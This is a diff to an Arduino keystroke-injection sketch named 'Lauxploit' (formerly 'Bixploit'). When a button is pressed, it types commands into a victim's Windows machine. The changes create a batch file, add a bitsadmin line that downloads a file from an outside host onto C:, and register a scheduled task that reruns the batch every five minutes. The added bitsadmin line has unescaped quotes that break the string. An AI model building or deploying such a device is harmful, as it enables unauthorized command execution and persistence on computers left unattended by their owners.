@@ -10,7 +10,7 @@ void loop()
   //if the button is pressed
   if (digitalRead(2) == LOW)
   {
-    //Startign a standart cmd
+    //Starting a standart cmd
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.press('r');
     delay(50);
@@ -86,10 +86,11 @@ void loop()
       delay(50);
       Keyboard.releaseAll();
     Keyboard.println(" ");
-    Keyboard.println("copy con Bixploit.bat");
+    Keyboard.println("copy con Lauxploit.bat");
     //Keyboard.println("\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" http://goo.gl/woC2kSp");
-    Keyboard.println("start http://goo.gl/x5sPkr");
-    Keyboard.println("Msg * \"Friendly reminder: NEVER LEAVE YOUR COMPUTER WITHOUT SURVEILLANCE\"");
+    //Keyboard.println("start http://goo.gl/x5sPkr");
+    //Keyboard.println("Msg * \"Friendly reminder: NEVER LEAVE YOUR COMPUTER WITHOUT SURVEILLANCE\"");
+    Keyboard.println("bitsadmin.exe /transfer "JobName" http://thumbs.dreamstime.com/b/cartoon-girl-crying-ice-cream-drop-28115622.jpg C:\ed\lvi.jpg");
     Keyboard.press(KEY_LEFT_CTRL);
     Keyboard.press('Z');
     delay(50);
@@ -97,13 +98,13 @@ void loop()
     Keyboard.println(" ");
 
     // Adding the reminder to the Windows' tasks
-    Keyboard.print("schtasks /create /sc minute /mo 1 /tn \"Bixploit\" /tr C:");
+    Keyboard.print("schtasks /create /sc minute /mo 5 /tn \"Lauxploit\" /tr C:");
       // Backslash escape sequence
       Keyboard.press(KEY_RIGHT_ALT);
       Keyboard.print("_");
       delay(50);
       Keyboard.releaseAll();
-    Keyboard.println("Bixploit.bat");
+    Keyboard.println("Lauxploit.bat");
 
     // Exiting properly the elevated console
     Keyboard.println("exit");
@@ -111,7 +112,7 @@ void loop()
     delay(800);
 
     // Exiting the entry console
-    Keyboard.println("Msg * \"Bixploit launched\"");
+    Keyboard.println("Msg * \"Lauxploit launched\"");
     Keyboard.println("exit");
   }
 }
